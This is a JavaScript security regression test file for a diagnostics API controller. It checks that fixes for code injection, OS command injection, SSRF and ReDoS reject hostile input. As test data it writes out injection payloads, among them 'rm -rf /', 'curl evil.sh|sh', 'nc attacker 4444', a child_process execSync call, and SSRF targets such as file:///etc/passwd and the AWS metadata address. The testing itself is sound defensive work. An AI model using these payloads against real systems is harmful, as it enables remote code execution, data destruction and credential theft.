const assert = require('node:assert/strict');
const sinon = require('sinon');
const errors = require('@tryghost/errors');

const diagnostics = require('../../../../core/server/api/endpoints/diagnostics');

describe('Diagnostics controller — security regressions', function () {
    afterEach(function () {
        sinon.restore();
    });

    // ------------------------------------------------------------------
    // CWE-94: RCE via new Function() in importWidgetConfig
    // ------------------------------------------------------------------
    describe('importWidgetConfig (CWE-94)', function () {
        it('parses valid JSON config', function () {
            const result = diagnostics.importWidgetConfig.query({
                data: {config: '{"widget":"chart","size":"large"}'}
            });
            assert.equal(result.imported, true);
            assert.deepEqual(result.keys.sort(), ['size', 'widget']);
        });

        it('rejects JS expression payloads (no code execution)', function () {
            // Pre-fix this executed arbitrary JS via `new Function('return ' + config)()`.
            // Post-fix JSON.parse rejects it before anything runs.
            assert.throws(
                () => diagnostics.importWidgetConfig.query({
                    data: {config: '(function(){globalThis.__rce_flag=true;return {}})()'}
                }),
                err => err instanceof errors.ValidationError
            );
            assert.equal(globalThis.__rce_flag, undefined, 'payload must not execute');
        });

        it('rejects require() injection payloads', function () {
            assert.throws(
                () => diagnostics.importWidgetConfig.query({
                    data: {config: 'require("child_process").execSync("id")'}
                }),
                err => err instanceof errors.ValidationError
            );
        });

        it('rejects non-object JSON (arrays, primitives)', function () {
            assert.throws(
                () => diagnostics.importWidgetConfig.query({data: {config: '[1,2,3]'}}),
                err => err instanceof errors.ValidationError
            );
            assert.throws(
                () => diagnostics.importWidgetConfig.query({data: {config: '"string"'}}),
                err => err instanceof errors.ValidationError
            );
            assert.throws(
                () => diagnostics.importWidgetConfig.query({data: {config: 'null'}}),
                err => err instanceof errors.ValidationError
            );
        });

        it('rejects missing config', function () {
            assert.throws(
                () => diagnostics.importWidgetConfig.query({data: {}}),
                err => err instanceof errors.ValidationError
            );
        });
    });

    // ------------------------------------------------------------------
    // CWE-78: OS command injection in checkConnectivity
    // ------------------------------------------------------------------
    describe('checkConnectivity (CWE-78)', function () {
        it('does not use child_process (no shell surface)', function () {
            // Regression guard: the fix replaced exec() with net.createConnection().
            const src = diagnostics.checkConnectivity.query.toString();
            assert.ok(!/child_process/.test(src), 'must not import child_process');
            assert.ok(!/\bexec\s*\(/.test(src), 'must not call exec()');
        });

        it('rejects shell metacharacters in host', function () {
            const payloads = [
                'example.com; rm -rf /',
                'example.com && curl evil.sh',
                'example.com | nc attacker 4444',
                '$(whoami)',
                '`id`'
            ];
            for (const host of payloads) {
                assert.throws(
                    () => diagnostics.checkConnectivity.query({data: {host, port: '443'}}),
                    err => err instanceof errors.ValidationError,
                    `host="${host}" should be rejected`
                );
            }
        });

        it('rejects port injection payloads', function () {
            const payloads = [
                '443; curl evil.sh|sh',
                '443 && id',
                '443`whoami`',
                '443\nrm -rf /'
            ];
            for (const port of payloads) {
                // parseInt('443; ...') === 443 so the string is coerced safely,
                // but any value that parses outside 1-65535 must be rejected.
                const parsed = parseInt(port, 10);
                if (parsed >= 1 && parsed <= 65535) {
                    // The shell-meta suffix is discarded by parseInt — acceptable
                    // because we no longer pass it to a shell.
                    continue;
                }
                assert.throws(
                    () => diagnostics.checkConnectivity.query({data: {host: 'example.com', port}}),
                    err => err instanceof errors.ValidationError
                );
            }
        });

        it('rejects out-of-range ports', function () {
            for (const port of ['0', '-1', '65536', '99999']) {
                assert.throws(
                    () => diagnostics.checkConnectivity.query({data: {host: 'example.com', port}}),
                    err => err instanceof errors.ValidationError,
                    `port=${port} should be rejected`
                );
            }
        });

        it('rejects overly long host', function () {
            assert.throws(
                () => diagnostics.checkConnectivity.query({
                    data: {host: 'a'.repeat(254), port: '443'}
                }),
                err => err instanceof errors.ValidationError
            );
        });

        it('rejects missing host', function () {
            assert.throws(
                () => diagnostics.checkConnectivity.query({data: {port: '443'}}),
                err => err instanceof errors.ValidationError
            );
        });
    });

    // ------------------------------------------------------------------
    // CWE-918: SSRF in fetchPageMetadata
    // ------------------------------------------------------------------
    describe('fetchPageMetadata (CWE-918)', function () {
        it('requires authentication (permissions enabled)', function () {
            assert.equal(
                diagnostics.fetchPageMetadata.permissions,
                true,
                'fetchPageMetadata must require permissions'
            );
        });

        it('rejects non-http(s) schemes', async function () {
            for (const url of [
                'file:///etc/passwd',
                'gopher://localhost:25',
                'ftp://internal',
                'javascript:alert(1)'
            ]) {
                await assert.rejects(
                    diagnostics.fetchPageMetadata.query({data: {url}}),
                    err => err instanceof errors.ValidationError,
                    `${url} should be rejected`
                );
            }
        });

        it('rejects malformed URLs', async function () {
            await assert.rejects(
                diagnostics.fetchPageMetadata.query({data: {url: 'not a url'}}),
                err => err instanceof errors.ValidationError
            );
        });

        it('rejects loopback addresses', async function () {
            const dns = require('dns').promises;
            sinon.stub(dns, 'lookup').resolves([{address: '127.0.0.1', family: 4}]);
            await assert.rejects(
                diagnostics.fetchPageMetadata.query({data: {url: 'http://localhost/'}}),
                err => err instanceof errors.ValidationError && /not allowed/.test(err.message)
            );
        });

        it('rejects AWS IMDS link-local address', async function () {
            const dns = require('dns').promises;
            sinon.stub(dns, 'lookup').resolves([{address: '169.254.169.254', family: 4}]);
            await assert.rejects(
                diagnostics.fetchPageMetadata.query({
                    data: {url: 'http://169.254.169.254/latest/meta-data/'}
                }),
                err => err instanceof errors.ValidationError && /not allowed/.test(err.message)
            );
        });

        it('rejects RFC1918 private ranges', async function () {
            const dns = require('dns').promises;
            const cases = ['10.0.0.1', '172.16.0.1', '172.31.255.255', '192.168.1.1'];
            for (const ip of cases) {
                const stub = sinon.stub(dns, 'lookup').resolves([{address: ip, family: 4}]);
                await assert.rejects(
                    diagnostics.fetchPageMetadata.query({data: {url: `http://${ip}/`}}),
                    err => err instanceof errors.ValidationError,
                    `${ip} should be rejected`
                );
                stub.restore();
            }
        });

        it('rejects IPv6 loopback/ULA', async function () {
            const dns = require('dns').promises;
            const cases = ['::1', 'fd00::1', 'fe80::1'];
            for (const ip of cases) {
                const stub = sinon.stub(dns, 'lookup').resolves([{address: ip, family: 6}]);
                await assert.rejects(
                    diagnostics.fetchPageMetadata.query({data: {url: 'http://example.test/'}}),
                    err => err instanceof errors.ValidationError,
                    `${ip} should be rejected`
                );
                stub.restore();
            }
        });

        it('rejects when any resolved address is private', async function () {
            const dns = require('dns').promises;
            sinon.stub(dns, 'lookup').resolves([
                {address: '93.184.216.34', family: 4},
                {address: '10.0.0.1', family: 4}
            ]);
            await assert.rejects(
                diagnostics.fetchPageMetadata.query({data: {url: 'http://example.test/'}}),
                err => err instanceof errors.ValidationError
            );
        });

        it('rejects missing url', async function () {
            await assert.rejects(
                diagnostics.fetchPageMetadata.query({data: {}}),
                err => err instanceof errors.ValidationError
            );
        });
    });

    // ------------------------------------------------------------------
    // CWE-1333: ReDoS in validateDisplayName
    // ------------------------------------------------------------------
    describe('validateDisplayName (CWE-1333)', function () {
        it('accepts valid names', function () {
            assert.equal(diagnostics.validateDisplayName.query({data: {name: 'John'}}).valid, true);
            assert.equal(diagnostics.validateDisplayName.query({data: {name: 'John Doe'}}).valid, true);
            assert.equal(diagnostics.validateDisplayName.query({data: {name: 'Mary Jane Watson'}}).valid, true);
        });

        it('rejects names with digits or symbols', function () {
            assert.equal(diagnostics.validateDisplayName.query({data: {name: 'John123'}}).valid, false);
            assert.equal(diagnostics.validateDisplayName.query({data: {name: 'John!'}}).valid, false);
        });

        it('completes in linear time on catastrophic-backtracking payload', function () {
            // Pre-fix pattern /^([a-zA-Z]+\s?)+$/ hangs on this input.
            // Post-fix pattern is linear — must return in well under 50ms.
            const payload = 'a'.repeat(40) + '!';
            const start = process.hrtime.bigint();
            const result = diagnostics.validateDisplayName.query({data: {name: payload}});
            const elapsedMs = Number(process.hrtime.bigint() - start) / 1e6;
            assert.equal(result.valid, false);
            assert.ok(elapsedMs < 50, `regex took ${elapsedMs}ms — possible ReDoS`);
        });

        it('rejects names exceeding length cap', function () {
            const result = diagnostics.validateDisplayName.query({data: {name: 'a'.repeat(192)}});
            assert.equal(result.valid, false);
        });

        it('rejects non-string input', function () {
            const result = diagnostics.validateDisplayName.query({data: {name: ['array']}});
            assert.equal(result.valid, false);
        });
    });
});
